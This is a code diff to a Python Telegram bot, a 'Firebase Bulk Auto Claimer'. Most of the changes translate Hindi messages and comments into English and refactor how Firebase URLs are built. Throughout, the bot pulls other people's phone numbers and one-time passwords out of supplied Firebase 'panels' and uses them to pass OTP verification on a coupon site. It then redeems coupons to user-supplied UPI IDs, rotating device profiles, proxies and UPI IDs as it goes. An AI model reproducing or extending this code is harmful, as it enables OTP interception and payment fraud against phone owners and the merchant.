-                    print(f"  [स्किप] {phone} पर OTP ट्रिगर नहीं हो पाया।")
+                    print(f"  [Skipped] Could not trigger OTP for {phone}.")
                     break
 
-                print(f"  {WAIT_SECONDS} सेकंड तक OTP का इंतजार किया जा रहा है...")
+                print(f"  Waiting {WAIT_SECONDS} seconds for OTP...")
                 otp = check_otp_in_firebase(fb_url, num_id)
 
                 if otp:
-                    print(f"\n[सफलता!] नंबर {phone} पर OTP मिल गया: {otp}")
+                    print(f"\n[Success] OTP received on {phone}: {otp}")
                     return {"url": fb_url, "id": num_id, "number": phone, "otp": otp}
 
-                print(f"  [फेल] {WAIT_SECONDS} सेकंड में OTP नहीं मिला।")
+                print(f"  [Failed] No OTP received within {WAIT_SECONDS} seconds.")
 
-            print(f"-> नंबर {phone} पर {MAX_SEND_RETRIES} बार कोशिश के बाद भी OTP नहीं मिला। अगले ऑनलाइन नंबर पर स्विच कर रहे हैं...")
+            print(f"-> No OTP on {phone} after {MAX_SEND_RETRIES} attempts. Switching to next online number...")
 
-        print(f"\n-> पैनल ({fb_url}) के सभी ऑनलाइन नंबर खत्म हो गए। अगले Firebase URL पर जा रहे हैं...")
+        print(f"\n-> Exhausted all online numbers on ({fb_url}). Moving to next Firebase URL...")
 
-    print("\n[समाप्त] सभी Firebase URLs और ऑनलाइन नंबर चेक हो चुके हैं।")
+    print("\n[Completed] All Firebase URLs and online numbers checked.")
     return None
 
 
 def _fetch_numbers_from_single_firebase_sync(firebase_url: str) -> list[str]:
-    """एक Active Firebase endpoint के केवल Online सेशन से 10-digit Indian mobile numbers निकालता है (Offline को स्किप करके)।"""
-    base = firebase_url.rstrip('/')
-    root_url = base[:-5] if base.endswith('.json') else base
-    urls_to_check = [f"{root_url}/.json", f"{root_url}/sms.json"]
+    """Extracts 10-digit Indian mobile numbers exclusively from Online sessions of an Active Firebase endpoint."""
+    root_url, query = _get_firebase_root_and_query(firebase_url)
+    q_suffix = f"?{query}" if query else ""
+    urls_to_check = [
+        _build_firebase_query_url(firebase_url, ""),
+        f"{root_url}/.json{q_suffix}",
+        f"{root_url}/sms.json{q_suffix}",
+    ]
+    urls_to_check = list(dict.fromkeys(urls_to_check))
 
     found_numbers = []
 
@@ -1011,13 +1149,11 @@ def _fetch_numbers_from_single_firebase_sync(firebase_url: str) -> list[str]:
             if not data:
                 continue
 
-            # 1. पहले केवल स्पष्ट रूप से 'online' सेशन वाले नंबर्स निकालें (offline को छोड़कर)
             online_nums = _extract_online_numbers_from_tree(data, inherited_offline=False, inherited_online=False)
             for num in online_nums:
                 if num not in found_numbers:
                     found_numbers.append(num)
 
-            # 2. अगर स्ट्रक्चर में explicit 'online' टैग नहीं है, तब भी 'offline' को हटाकर ही नंबर्स लें
             if not found_numbers and isinstance(data, dict):
                 filtered_data = {
                     k: v
@@ -1041,9 +1177,8 @@ def _fetch_numbers_from_single_firebase_sync(firebase_url: str) -> list[str]:
 
 async def fetch_random_active_number_from_panels(context: ContextTypes.DEFAULT_TYPE) -> Optional[dict]:
     """
-    सेशन में सेव हुए Active Firebase Panels से पहले /numbers.json के online नंबर निकालता है;
-    यदि /numbers.json नोड न मिले तो ट्री स्कैन से online एक्टिव नंबर फेच करता है ताकि
-    auto_claim_triplet_on_woohoo में Woohoo पर असली OTP भेजा जा सके।
+    Fetches an active online number from saved Active Firebase Panels
+    (via /numbers.json first, falling back to recursive tree scanning).
     """
     session_panels: dict = context.user_data.get("session_panels", {})
     active_endpoints = [
@@ -1090,17 +1225,18 @@ async def fetch_random_active_number_from_panels(context: ContextTypes.DEFAULT_T
 
 def _poll_otp_for_number_sync(firebase_url: str, number: str, number_id: Optional[str], baseline_otps: list[str]) -> Optional[str]:
     """
-    5 सेकंड तक हर 1 सेकंड में Firebase से उस नंबर के लिए नया OTP चेक करता है
-    (पहले /numbers/{number_id}/otp.json और फिर पूरे Firebase JSON में से)।
+    Polls Firebase every 1 second for up to WAIT_SECONDS (5s) for a new OTP
+    associated with the target number.
     """
-    base = firebase_url.rstrip('/')
-    root_url = base[:-5] if base.endswith('.json') else base
+    root_url, query = _get_firebase_root_and_query(firebase_url)
+    q_suffix = f"?{query}" if query else ""
+    exact_url = _build_firebase_query_url(firebase_url, "")
+    node_urls = list(dict.fromkeys([exact_url, f"{root_url}/sms.json{q_suffix}", f"{root_url}/.json{q_suffix}"]))
 
     for _ in range(WAIT_SECONDS):
-        # 1. यदि number_id उपलब्ध है तो सीधे /numbers/{number_id}/otp.json चेक करें
         if number_id:
             try:
-                res = requests.get(f"{root_url}/numbers/{number_id}/otp.json", timeout=5)
+                res = requests.get(f"{root_url}/numbers/{number_id}/otp.json{q_suffix}", timeout=5)
                 if res.status_code == 200:
                     otp_val = res.json()
                     if otp_val and str(otp_val).strip() != "":
@@ -1110,8 +1246,7 @@ def _poll_otp_for_number_sync(firebase_url: str, number: str, number_id: Optiona
             except Exception:
                 pass
 
-        # 2. अन्य Firebase स्ट्रक्चर (/sms.json या /.json) से नया OTP निकालें
-        for node_url in (f"{root_url}/sms.json", f"{root_url}/.json"):
+        for node_url in node_urls:
             try:
                 res = requests.get(node_url, timeout=6)
                 if res.status_code == 200 and res.json():
@@ -1128,11 +1263,13 @@ def _poll_otp_for_number_sync(firebase_url: str, number: str, number_id: Optiona
 
 
 def _get_baseline_otps_sync(firebase_url: str) -> list[str]:
-    """OTP भेजने से पहले Firebase में पहले से मौजूद पुराने OTPs की लिस्ट लेता है।"""
-    base = firebase_url.rstrip('/')
-    root_url = base[:-5] if base.endswith('.json') else base
+    """Captures pre-existing OTPs in Firebase before triggering a new OTP request."""
+    root_url, query = _get_firebase_root_and_query(firebase_url)
+    q_suffix = f"?{query}" if query else ""
+    exact_url = _build_firebase_query_url(firebase_url, "")
+    node_urls = list(dict.fromkeys([exact_url, f"{root_url}/sms.json{q_suffix}", f"{root_url}/.json{q_suffix}"]))
     existing = []
-    for node_url in (f"{root_url}/sms.json", f"{root_url}/.json"):
+    for node_url in node_urls:
         try:
             res = requests.get(node_url, timeout=6)
             if res.status_code == 200 and res.json():
@@ -1151,25 +1288,24 @@ async def auto_claim_triplet_on_woohoo(
     upi_id: str,
 ) -> dict:
     """
-    जब Online Number + Coupon + UPI का पेयर बनता है:
-    1. UPI ID को साइड में सुरक्षित रखता है और आखिरी स्टेप (Step 3) में ऑटोमेटिक सबमिट करता है।
-    2. एक ही Coupon Code को तब तक पकड़कर रखता है जब तक वह सक्सेसफुली क्लेम न हो जाए।
-    3. Active Firebase Panels के Online Numbers पर Woohoo Step 1 (Send OTP) ट्रिगर करता है,
-       5 सेकंड वेट के साथ अधिकतम 2 बार रीट्राई करता है, और OTP न मिलने पर अगला Online Number उठाता है।
-    4. Firebase से OTP मिलते ही Step 2 (Verify OTP) और Step 3 (UPI Submit) पूरा करके रिजल्ट लौटाता है।
+    Executes the full automated claim workflow for an Online Number + Coupon + UPI triplet:
+    1. Reserves the UPI ID for automatic submission in Step 3.
+    2. Locks the current coupon code until it is successfully claimed.
+    3. Dispatches Woohoo Step 1 (Send OTP) across online numbers in Active Firebase Panels
+       (up to 2 retries with 5-second polling per number).
+    4. Automatically completes Step 2 (OTP Verification) and Step 3 (UPI Submission).
     """
     session_panels: dict = context.user_data.get("session_panels", {})
     active_endpoints = [
         ep for ep, info in session_panels.items() if info.get("is_active")
     ]
     if not active_endpoints:
-        return {"success": False, "reason": "NO_ACTIVE_PANELS", "message": "कोई Active Firebase Panel नहीं मिला।"}
+        return {"success": False, "reason": "NO_ACTIVE_PANELS", "message": "No active Firebase panels found."}
 
     used_numbers: list[str] = context.user_data.setdefault("used_firebase_numbers", [])
-    last_error_msg = "किसी भी Online Number पर OTP या Claim पूरा नहीं हो पाया।"
+    last_error_msg = "Unable to receive OTP or complete claim on any online number."
 
     for fb_url in active_endpoints:
-        # 1. पहले /numbers.json से online नंबर निकालें, नहीं तो ट्री स्कैन से निकालें
         structured_online = await asyncio.to_thread(get_online_numbers, fb_url)
         candidates = []
         if structured_online:
@@ -1193,7 +1329,6 @@ async def auto_claim_triplet_on_woohoo(
             if phone not in used_numbers:
                 used_numbers.append(phone)
 
-            # हर नंबर के लिए नया UnifiedSessionClient सेशन तैयार करें
             selected_device = random.choice(DEVICE_PROFILES)
             proxy_cfg = random.choice(PROXIES_CONFIG) if PROXIES_CONFIG else None
             client = UnifiedSessionClient(
@@ -1210,7 +1345,7 @@ async def auto_claim_triplet_on_woohoo(
                 scraped_states = page_info.get("states", [])
 
                 if not dynamic_token:
-                    last_error_msg = "Website se session token fetch nahi ho paya."
+                    last_error_msg = "Failed to fetch initial session token from the website."
                     continue
 
                 matching_states = [s for s in scraped_states if s["name"] in STATES_LIST]
@@ -1229,7 +1364,6 @@ async def auto_claim_triplet_on_woohoo(
                 received_otp = None
                 coupon_invalid = False
 
-                # एक नंबर पर अधिकतम MAX_SEND_RETRIES (2) बार OTP भेजने व 5s चेक करने का लूप
                 for attempt in range(1, MAX_SEND_RETRIES + 1):
                     if num_id:
                         await asyncio.to_thread(clear_old_otp, fb_url, num_id)
@@ -1269,7 +1403,6 @@ async def auto_claim_triplet_on_woohoo(
                             break
                         continue
 
-                    # 5 सेकंड तक Firebase से इस नंबर का OTP चेक करें
                     received_otp = await asyncio.to_thread(
                         _poll_otp_for_number_sync,
                         fb_url,
@@ -1287,14 +1420,11 @@ async def auto_claim_triplet_on_woohoo(
                         "message": f"Coupon `{coupon_code}` Error: {last_error_msg}",
                     }
 
-                # यदि 2 बार ट्राई करने पर भी OTP नहीं मिला तो इसी कूपन के साथ अगले Online नंबर पर स्विच करें
                 if not received_otp:
-                    last_error_msg = f"Number {phone} par {MAX_SEND_RETRIES} attempts mein OTP nahi mila."
+                    last_error_msg = f"No OTP received on {phone} after {MAX_SEND_RETRIES} attempts."
                     continue
 
-                # ------------------------------------------
-                # STEP 2: OTP वेरिफिकेशन (ऑटोमेटिक)
-                # ------------------------------------------
+                # STEP 2: OTP Verification
                 recaptcha_token_2 = await client.get_dynamic_token(action="submit")
                 payload_step_2 = {
                     "__RequestVerificationToken": dynamic_token,
@@ -1325,9 +1455,7 @@ async def auto_claim_triplet_on_woohoo(
                     last_error_msg = f"OTP Verification Failed ({phone}): {res_2.get('messageBody') or res_2}"
                     continue
 
-                # ------------------------------------------
-                # STEP 3: वही 8-बार वाली UPI ID डालकर फाइनल सबमिट
-                # ------------------------------------------
+                # STEP 3: Final UPI Submission
                 recaptcha_token_3 = await client.get_dynamic_token(action="submit")
                 payload_step_3 = {
                     "__RequestVerificationToken": dynamic_token,
@@ -1366,7 +1494,7 @@ async def auto_claim_triplet_on_woohoo(
                         "server_message": success_msg,
                     }
                 else:
-                    last_error_msg = f"Final UPI Submit Error: {res_3.get('messageBody') or res_3}"
+                    last_error_msg = f"Final UPI Submission Error: {res_3.get('messageBody') or res_3}"
                     continue
 
             except Exception as e:
@@ -1383,10 +1511,7 @@ async def auto_claim_triplet_on_woohoo(
 
 
 def pick_unused_firebase_coupon(context: ContextTypes.DEFAULT_TYPE) -> Optional[dict]:
-    """
-    भेजे हुए कूपन्स में से कोई एक unused coupon उठाता है और उसे used मार्क कर देता है
-    ताकि वही कूपन दोबारा यूज़ न हो।
-    """
+    """Selects one unused coupon from the user's queue and marks it as used."""
     all_coupons: list[str] = context.user_data.get("firebase_coupons", [])
     used_coupons: list[str] = context.user_data.setdefault("used_firebase_coupons", [])
 
@@ -1406,10 +1531,7 @@ def pick_unused_firebase_coupon(context: ContextTypes.DEFAULT_TYPE) -> Optional[
 
 
 def release_unredeemed_firebase_coupon(context: ContextTypes.DEFAULT_TYPE, coupon_code: Optional[str] = None) -> Optional[str]:
-    """
-    अगर कूपन सक्सेसफुली रिडीम नहीं होता है, तो उसे used लिस्ट से वापस निकालकर
-    दोबारा उपलब्ध (available) कूपन्स में डाल देता है।
-    """
+    """Returns an unredeemed coupon back into the available pool if redemption fails."""
     used_coupons: list[str] = context.user_data.setdefault("used_firebase_coupons", [])
     target_coupon = (coupon_code or "").strip().upper()
 
@@ -1426,10 +1548,7 @@ def release_unredeemed_firebase_coupon(context: ContextTypes.DEFAULT_TYPE, coupo
 
 
 def consume_firebase_upi_use(context: ContextTypes.DEFAULT_TYPE) -> dict:
-    """
-    वर्तमान UPI ID का 1 यूज़ काउंट करता है।
-    8 बार सेम UPI ID देने के बाद 'needs_new_upi': True लौटाता है ताकि बॉट सीधे नई UPI ID मांग सके।
-    """
+    """Consumes 1 usage slot of the active UPI ID and flags when 8 uses are reached."""
     upi_cfg = context.user_data.get("firebase_upi_config")
     if not upi_cfg or upi_cfg.get("remaining_uses", 0) <= 0:
         return {"upi_id": None, "needs_new_upi": True, "remaining_uses": 0}
@@ -1457,7 +1576,7 @@ def consume_firebase_upi_use(context: ContextTypes.DEFAULT_TYPE) -> dict:
 
 
 def read_text_from_zip(zip_path: str) -> str:
-    """ZIP file के अंदर मौजूद केवल .txt files का text निकालता है।"""
+    """Extracts text from all .txt files inside a ZIP archive."""
     combined_text = []
     with zipfile.ZipFile(zip_path, 'r') as zf:
         for file_info in zf.infolist():
@@ -1469,18 +1588,18 @@ def read_text_from_zip(zip_path: str) -> str:
                         content = f.read().decode('utf-8', errors='ignore')
                         combined_text.append(content)
                 except Exception as e:
-                    logger.warning(f"File {file_info.filename} read करने में दिक्कत: {e}")
+                    logger.warning(f"Failed to read {file_info.filename} from ZIP: {e}")
     return "\n".join(combined_text)
 
 
 def read_text_from_txt(txt_path: str) -> str:
-    """Direct .txt file का पूरा text निकालता है।"""
+    """Reads text content from a .txt file."""
     with open(txt_path, "r", encoding="utf-8", errors="ignore") as f:
         return f.read()
 
 
 def _record_coupon_claim_sync(entry: dict):
-    """Direct Mobile और Firebase दोनों से सफलतापूर्वक क्लेम हुए कूपन को JSON file में save करता है।"""
+    """Appends a successfully claimed coupon record to claimed_coupons.json."""
     data = []
     if os.path.exists(CLAIMS_DATA_FILE):
         try:
@@ -1498,13 +1617,13 @@ def _record_coupon_claim_sync(entry: dict):
 
 
 async def record_successful_coupon_claim(entry: dict):
-    """Thread-safe तरीके से सफल कूपन क्लेम (Direct Mobile या Firebase) को save करता है।"""
+    """Thread-safe wrapper to persist successful coupon claims."""
     async with file_lock:
         await asyncio.to_thread(_record_coupon_claim_sync, entry)
 
 
 def _get_real_leaderboard_sync() -> list[dict]:
-    """claimed_coupons.json से हर यूजर का रियल कूपन क्लेम काउंट निकालता है (Firebase + Direct Mobile दोनों)।"""
+    """Calculates real-time per-user coupon claim counts from claimed_coupons.json."""
     if not os.path.exists(CLAIMS_DATA_FILE):
         return []
 
@@ -1541,7 +1660,7 @@ def _get_real_leaderboard_sync() -> list[dict]:
 
 
 async def get_leaderboard_text(current_user_id: int) -> str:
-    """रियल कूपन क्लेम लीडरबोर्ड का फॉर्मेटेड टेक्स्ट तैयार करता है।"""
+    """Formats the real-time coupon claim leaderboard message."""
     async with file_lock:
         leaderboard = await asyncio.to_thread(_get_real_leaderboard_sync)
 
@@ -1549,8 +1668,8 @@ async def get_leaderboard_text(current_user_id: int) -> str:
         return (
             "🏆 **Coupon Claim Leaderboard**\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "अभी तक किसी भी यूजर ने कोई कूपन क्लेम नहीं किया है।\n"
-            "सबसे पहले कूपन क्लेम करके टॉप पर आएं!"
+            "No coupons have been claimed yet.\n"
+            "Be the first to claim a coupon and take the #1 spot!"
         )
 
     medals = {1: "🥇", 2: "🥈", 3: "🥉"}
@@ -1588,10 +1707,7 @@ async def get_leaderboard_text(current_user_id: int) -> str:
 # 5. SESSION STORAGE HELPERS
 # ==========================================
 def save_panels_to_user_session(context: ContextTypes.DEFAULT_TYPE, new_results: list[dict]) -> int:
-    """
-    यूजर के current session में सारे checked panels (active/inactive) save करता है।
-    ये तब तक saved रहते हैं जब तक यूजर दोबारा /start नहीं दबाता।
-    """
+    """Saves all checked panels (active and inactive) to the user's active session."""
     if "session_panels" not in context.user_data:
         context.user_data["session_panels"] = {}
 
@@ -1639,25 +1755,25 @@ async def process_text_data_for_bot(
     if is_from_file:
         if not urls_found:
             return [
-                "🚫 **Invalid File Content (Rejected):**\n"
-                "इस file में कोई भी link नहीं मिला!\n\n"
-                "📌 कृपया केवल **Firebase / Panel links** वाली `.txt` या `.zip` file ही upload करें।"
+                "🚫 **Invalid File Content (Rejected)**\n"
+                "No valid links were found inside the uploaded file.\n\n"
+                "📌 Please upload a `.txt` or `.zip` file containing valid **Firebase / Panel links**."
             ], False
 
         valid_pairs, rejected_count = filter_valid_firebase_urls(urls_found)
         if not valid_pairs:
             return [
-                "🚫 **Invalid Links File (Rejected):**\n"
-                f"इस file में `{len(urls_found)}` links मिले, लेकिन **एक भी valid Firebase / Panel link नहीं है**!\n\n"
-                "📌 फालतू text या किसी और वेबसाइट के links वाली file स्वीकार नहीं की जाएगी। "
-                "केवल वही `.txt` या `.zip` file भेजें जिसमें आपके Firebase/Panel links हों।"
+                "🚫 **Invalid Links File (Rejected)**\n"
+                f"Found `{len(urls_found)}` links in this file, but **none of them are valid Firebase / Panel endpoints**.\n\n"
+                "📌 Unrelated text or non-Firebase links are not accepted. "
+                "Please upload a `.txt` or `.zip` file containing valid Firebase/Panel URLs."
             ], False
     else:
         if len(urls_found) > MAX_DIRECT_LINKS:
             return [
-                f"🚫 **Limit Exceeded:** आपने एक साथ `{len(urls_found)}` links भेजे हैं!\n"
-                f"⚠️ Direct paste में maximum `{MAX_DIRECT_LINKS}` links ही allowed हैं।\n\n"
-                "📄 कृपया इन सभी links को एक **`.txt`** या **`.zip`** file में डालकर यहाँ upload करें।"
+                f"🚫 **Limit Exceeded:** You submitted `{len(urls_found)}` links at once.\n"
+                f"⚠️ Direct message input supports a maximum of `{MAX_DIRECT_LINKS}` links.\n\n"
+                "📄 Please place all links inside a **`.txt`** or **`.zip`** file and upload it here."
             ], False
         valid_pairs, rejected_count = filter_valid_firebase_urls(urls_found)
 
@@ -1681,14 +1797,14 @@ async def process_text_data_for_bot(
         total_in_session = save_panels_to_user_session(context, valid_results)
 
         rejected_note = (
-            f"\n⚠️ *({rejected_count} फालतू/non-Firebase links को ignore कर दिया गया)*"
+            f"\n⚠️ *({rejected_count} invalid/non-Firebase links were ignored)*"
             if rejected_count > 0
             else ""
         )
 
         output_blocks.append(
-            f"✅ **Total {len(valid_results)} Valid Firebase Endpoints मिले और Session में Save हुए:**\n"
-            f"📌 *(इस session में कुल saved panels: `{total_in_session}`)*"
+            f"✅ **Found `{len(valid_results)}` Valid Firebase Endpoints and Saved to Session**\n"
+            f"📌 *(Total panels saved in current session: `{total_in_session}`)*"
             f"{rejected_note}\n"
         )
         for idx, item in enumerate(valid_results, 1):
@@ -1700,7 +1816,7 @@ async def process_text_data_for_bot(
             output_blocks.append(block)
     elif not numbers and not otps:
         output_blocks.append(
-            "❌ **Firebase Endpoint Not Found:** इन links में कोई valid Firebase endpoint नहीं मिला।"
+            "❌ **Firebase Endpoint Not Found:** No valid Firebase endpoint could be extracted from the provided links."
         )
 
     if numbers or otps:
@@ -1715,7 +1831,7 @@ async def process_text_data_for_bot(
 
     if not valid_results and not urls_found and not numbers and not otps:
         output_blocks.append(
-            "⚠️ **No Data Found:** कोई valid mobile number, OTP या Firebase URL नहीं मिला।"
+            "⚠️ **No Data Found:** No valid mobile numbers, OTPs, or Firebase URLs were detected."
         )
 
     messages = []
@@ -1737,7 +1853,7 @@ async def process_text_data_for_bot(
 # 7. KEYBOARDS & UI DESIGN
 # ==========================================
 def get_main_menu_keyboard() -> ReplyKeyboardMarkup:
-    """Bottom menu keyboard: 4 options ऊपर और उनके नीचे Leaderboard का option."""
+    """Main reply keyboard menu."""
     keyboard = [
         ["Claim Coupon", "Check Coupon"],
         ["Buy Coupon", "Support"],
@@ -1809,7 +1925,7 @@ def get_firebase_triplet_keyboard() -> InlineKeyboardMarkup:
 
 
 def get_support_inline_keyboard() -> InlineKeyboardMarkup:
-    """Support button के लिए direct Telegram link button."""
+    """Direct support Telegram link button."""
     keyboard = [
         [
             InlineKeyboardButton(
@@ -1825,7 +1941,7 @@ CLAIM_PANEL_TEXT = (
     "━━━━━━━━━━━━━━━━━━━━━━\n"
     "🚀 **Firebase Bulk Auto Claimer**\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n\n"
-    "Please select an option below to input your Firebase Panel:\n"
+    "Please select an option below to proceed:\n"
 )
 
 PASTE_URL_PROMPT_TEXT = (
@@ -1833,33 +1949,33 @@ PASTE_URL_PROMPT_TEXT = (
     "📥 **Direct / Bulk / File Firebase Input**\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n\n"
     "Please send your **Firebase URL** directly, paste **multiple URLs in bulk** "
-    "(up to 20 links at once), or if you have more than 20 links, upload a **`.txt` or `.zip` file** containing **only those Firebase/Panel links**.\n\n"
+    "(up to 20 links at once), or upload a **`.txt` or `.zip` file** containing **only your Firebase/Panel links**.\n\n"
     "👇 *Send your links or file below, or tap Cancel to go back:*"
 )
 
 COUPON_PROMPT_AFTER_ACTIVE_TEXT = (
-    "🎟️ **Active Firebase Panel मिल गया है! अब अपने Coupon Codes भेजें:**\n\n"
-    "• आप एक **Single Coupon**, एक साथ **Multiple Coupons** (जैसे 8 coupons sequence/line-by-line), या **`.txt` file** भेज सकते हैं।\n\n"
-    "👇 *नीचे अपने कूपन भेजें या Cancel दबाएं:*"
+    "🎟️ **Active Firebase Panel Verified! Now Send Your Coupon Codes:**\n\n"
+    "• You can send a **Single Coupon**, **Multiple Coupons** (space, comma, or line-separated), or upload a **`.txt` file**.\n\n"
+    "👇 *Send your coupon codes below or tap Cancel:*"
 )
 
 
 def build_fresh_upi_prompt_text(coupon_count: int) -> str:
     return (
-        f"✅ **Total `{coupon_count}` Coupon Codes सेव हो गए हैं!**\n\n"
-        "💳 **अब एक एकदम Fully Fresh UPI ID भेजें (e.g., `name@upi`):**\n"
-        f"⚠️ *यह UPI ID लगातार **{MAX_FIREBASE_UPI_USES} बार** सेम रहेगी। {MAX_FIREBASE_UPI_USES} बार पूरा होते ही आपसे डायरेक्ट नई UPI ID मांगी जाएगी (डुप्लीकेट UPI ID allowed नहीं है)।*\n\n"
-        "👇 *नीचे अपनी Fresh UPI ID भेजें या Cancel दबाएं:*"
+        f"✅ **Total `{coupon_count}` Coupon Codes Saved Successfully!**\n\n"
+        "💳 **Now Please Enter a Fresh UPI ID (e.g., `name@upi`):**\n"
+        f"⚠️ *This UPI ID will remain locked for **{MAX_FIREBASE_UPI_USES} consecutive claims**. Once all {MAX_FIREBASE_UPI_USES} uses are completed, you will be prompted for a new UPI ID (duplicate UPI IDs are not permitted).*\n\n"
+        "👇 *Enter your fresh UPI ID below or tap Cancel:*"
     )
 
 
 NEXT_NEW_UPI_PROMPT_TEXT = (
-    "🔄 **8 बार यूज़ पूरा हो गया है! अब डायरेक्ट नई Fresh UPI ID भेजें (e.g., `name@upi`):**\n"
-    "⚠️ *पुरानी/डुप्लीकेट UPI ID दोबारा स्वीकार नहीं की जाएगी।*"
+    "🔄 **All 8 Usage Slots Completed! Please Enter a New Fresh UPI ID (e.g., `name@upi`):**\n"
+    "⚠️ *Previously used or duplicate UPI IDs will be rejected.*"
 )
 
 FINAL_PNL_BATCH_COMPLETE_TEXT = (
-    "🎉 Process successfully complete ho gaya! Naya session start karne ke liye /pnlclaim bhejein"
+    "🎉 Process completed successfully! Send /pnlclaim to start a new session."
 )
 
 
@@ -1869,7 +1985,7 @@ def build_atoz_claim_log_text(
     remaining_coupons: int,
     server_message: str,
 ) -> str:
-    """हर कूपन क्लेम होने पर A-to-Z पूरी डिटेल का लॉग तैयार करता है।"""
+    """Builds the full A-to-Z claim log after each successful coupon redemption."""
     return (
         "✅ **Coupon Successfully Redeemed — Full A-to-Z Claim Log**\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -1901,9 +2017,9 @@ def _extract_telegram_user_info(update: Update) -> dict:
 
 
 async def send_welcome_portal(message_target, old_count: int = 0) -> None:
-    """मुख्य वेलकम मैसेज और मेनू कीबोर्ड भेजता है।"""
+    """Sends the main welcome message and menu keyboard."""
     reset_note = (
-        f"\n🔄 *पिछला session ({old_count} panels) साफ़ कर दिया गया है और नया session शुरू हो गया है।*\n"
+        f"\n🔄 *Previous session ({old_count} panels) has been cleared and a fresh session has started.*\n"
         if old_count > 0
         else ""
     )
@@ -1919,14 +2035,12 @@ async def send_welcome_portal(message_target, old_count: int = 0) -> None:
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     chat_id = update.effective_chat.id
 
-    # दोबारा /start दबाने पर पिछला सारा session data और Playwright session reset हो जाएगा
     await close_user_session(chat_id)
     old_count = len(context.user_data.get("session_panels", {}))
     context.user_data.clear()
     context.user_data["session_panels"] = {}
     context.user_data["session_started_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # सबसे पहले Force Channel Join वेरिफिकेशन चेक करें
     if not await ensure_user_subscribed(update, context):
         return ConversationHandler.END
 
@@ -1935,7 +2049,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
 
 
 async def pnlclaim_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """/pnlclaim भेजते ही सीधे Claim Coupon का पहला वाला (Paste Firebase URL Direct) सेशन ट्रिगर करता है।"""
+    """Directly triggers the Firebase URL input flow (/pnlclaim)."""
     if not update.message or update.effective_chat.type != "private":
         return ConversationHandler.END
 
@@ -1954,7 +2068,7 @@ async def pnlclaim_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -
 
 
 async def claim_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """/claim भेजने पर सीधे Direct Send Your Mobile Number वाला सेशन ट्रिगर करता है।"""
+    """Directly triggers the Direct Mobile Number claim flow (/claim)."""
     if not update.message or update.effective_chat.type != "private":
         return ConversationHandler.END
 
@@ -1964,19 +2078,19 @@ async def claim_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
     chat_id = update.effective_chat.id
 
     async with get_user_lock(chat_id):
-        status_msg = await update.message.reply_text("⏳ Naya session prepare ho raha hai...")
+        status_msg = await update.message.reply_text("⏳ Preparing a new session, please wait...")
         token_ok = await init_user_session(chat_id)
 
         if not token_ok:
             await status_msg.edit_text(
-                "⚠️ Website se initial session token fetch nahi ho paya. "
-                "Please internet connection check karein ya dobara try karein.",
+                "⚠️ Unable to fetch initial session token from the website. "
+                "Please check your connection and try again.",
                 reply_markup=get_cancel_to_claim_keyboard(),
             )
             return ConversationHandler.END
 
         await status_msg.edit_text(
-            "🚀 Naya session start ho gaya hai.\nPlease apna 10-digit mobile number bhejein:",
+            "🚀 New session initialized.\nPlease enter your 10-digit mobile number:",
             reply_markup=get_cancel_to_claim_keyboard(),
         )
         return WAITING_FOR_DIRECT_MOBILE_FLOW
@@ -2003,19 +2117,19 @@ async def handle_other_main_buttons(update: Update, context: ContextTypes.DEFAUL
     text = update.message.text
     if text == "Check Coupon":
         await update.message.reply_text(
-            "🚫 **Check Coupon — Temporarily Closed / Not Available**\n\n"
-            "यह फीचर फिलहाल अस्थायी रूप से बंद (Temporarily Closed) है।",
+            "🚫 **Check Coupon — Temporarily Unavailable**\n\n"
+            "This feature is currently disabled for maintenance.",
             parse_mode=ParseMode.MARKDOWN,
         )
     elif text == "Buy Coupon":
         await update.message.reply_text(
-            "🛒 **Buy Coupon**\nThis feature will be configured next.",
+            "🛒 **Buy Coupon**\nThis feature will be configured shortly.",
             parse_mode=ParseMode.MARKDOWN,
         )
     elif text == "Support":
         await update.message.reply_text(
             "🎧 **Customer Support**\n\n"
-            "किसी भी मदद या जानकारी के लिए नीचे दिए गए बटन पर क्लिक करके हमारी सपोर्ट टीम से संपर्क करें:",
+            "For assistance or inquiries, please contact our support team using the button below:",
             reply_markup=get_support_inline_keyboard(),
             parse_mode=ParseMode.MARKDOWN,
         )
@@ -2029,7 +2143,7 @@ async def handle_other_main_buttons(update: Update, context: ContextTypes.DEFAUL
 
 
 async def verify_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Verify Membership बटन क्लिक होने पर बचे हुए चैनल्स चेक करता है और वेरिफाई होते ही मेनू खोलता है।"""
+    """Verifies channel membership when the Verify button is clicked."""
     query = update.callback_query
     if not query or query.message.chat.type != "private":
         return ConversationHandler.END
@@ -2042,9 +2156,9 @@ async def verify_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         reply_markup = build_join_keyboard(unjoined)
         try:
             await query.edit_message_text(
-                "🚫 **Verification Failed!**\n\n"
-                "Abhi bhi neeche diye gaye channels/group join karna baaki hai.\n"
-                "Inhe join karke dobara **'✅ Verify Membership'** dabayein:",
+                "🚫 **Verification Failed**\n\n"
+                "You still have not joined all required channels/groups listed below.\n"
+                "Please join them and tap **'✅ Verify Membership'** again:",
                 reply_markup=reply_markup,
                 parse_mode="Markdown",
             )
@@ -2078,32 +2192,30 @@ async def claim_inline_callback_handler(update: Update, context: ContextTypes.DE
 
     elif data == "claim_send_mobile":
         async with get_user_lock(chat_id):
-            await query.edit_message_text("⏳ Naya session prepare ho raha hai...")
+            await query.edit_message_text("⏳ Preparing a new session, please wait...")
             token_ok = await init_user_session(chat_id)
 
             if not token_ok:
                 await query.edit_message_text(
-                    "⚠️ Website se initial session token fetch nahi ho paya. "
-                    "Please internet connection check karein ya dobara try karein.",
+                    "⚠️ Unable to fetch initial session token from the website. "
+                    "Please check your connection and try again.",
                     reply_markup=get_cancel_to_claim_keyboard(),
                 )
                 return ConversationHandler.END
 
             await query.edit_message_text(
-                "🚀 Naya session start ho gaya hai.\nPlease apna 10-digit mobile number bhejein:",
